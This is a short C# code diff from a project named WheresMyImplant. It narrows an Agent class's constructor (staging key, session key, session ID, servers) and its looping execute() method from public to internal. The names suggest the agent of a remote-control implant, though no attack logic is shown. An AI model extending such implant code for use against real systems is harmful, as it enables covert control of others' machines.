@@ -35,7 +35,7 @@ namespace WheresMyImplant
         private JobTracking jobTracking;
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Agent(String stagingKey, String sessionKey, String sessionId, String servers)
+        internal Agent(String stagingKey, String sessionKey, String sessionId, String servers)
         {
             this.sessionId = sessionId;
             defaultResponse = "";
@@ -50,7 +50,7 @@ namespace WheresMyImplant
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public void execute()
+        internal void execute()
         {
             while (true)
             {
